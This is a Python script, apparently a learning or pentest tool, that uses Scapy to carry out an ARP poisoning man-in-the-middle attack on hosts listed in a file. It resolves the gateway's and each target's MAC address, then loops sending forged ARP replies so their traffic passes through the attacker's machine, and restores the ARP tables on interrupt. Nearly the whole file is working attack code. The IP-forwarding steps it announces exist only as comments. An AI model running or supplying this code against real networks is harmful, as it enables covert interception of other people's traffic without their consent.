
from scapy.all import *
import os
import signal
import sys
import threading
import time
import netifaces



#Given an IP, get the MAC. Broadcast ARP Request for a IP Address. Should recieve
#an ARP reply with MAC Address
def get_mac(ip_address,interface):
    #ARP request is constructed. sr function is used to send/ receive a layer 3 packet
    #Alternative Method using Layer 2: resp, unans =  srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip_address))
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10,iface=interface)
    #resp,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst = ip_address), timeout = 2, iface = 'br0', inter = 0.1)
    for s,r in resp:
        return r[ARP].hwsrc
    return None


#Restore the network by reversing the ARP poison attack. Broadcast ARP Reply with
#correct MAC and IP Address information
def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
    print("[*] Disabling IP forwarding")
    #Disable IP Forwarding on a mac
    #kill process on a mac
    os.kill(os.getpid(), signal.SIGTERM)
#Keep sending false ARP replies to put our machine in the middle to intercept packets
#This will use our interface MAC address as the hwsrc for the ARP reply
def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Started ARP poison attack [CTRL-C to stop]")
    try:
        while True:
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Stopped ARP poison attack. Restoring network")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)

#Start the script
print("[*] Starting script: arp_poison.py")
print("[*] Enabling IP forwarding")
#Enable IP Forwarding on a mac
#print(f"[*] Gateway IP address: {gateway_ip}")
#print(f"[*] Target IP address: {target_ip}")
def arp_poison_attack(interface, ip_file):
    conf.verb = 0
    gws=netifaces.gateways()
    gateway_ip = gws['default'][netifaces.AF_INET][0]
    with open(ip_file, "r") as f:
          for line in f.readlines():
            # Traiter la ligne et ainsi de suite ...
            target_ip=line.strip()
            print("targerip "+str(target_ip))

            gateway_mac = get_mac(gateway_ip,interface)
            if gateway_mac is None:
                print("[!] Unable to get gateway MAC address. Exiting..")
                sys.exit(0)
            else:
                print("Gateway MAC address: ")
            target_mac = get_mac(target_ip,interface)
            if target_mac is None:
                print("[!] Unable to get target MAC address. Exiting..")
                sys.exit(0)
            else:
                print(" Target MAC address:")
            #ARP poison thread
            arp_poison(gateway_ip, gateway_mac, target_ip, target_mac)

#arp_poison_attack('br0','filex')
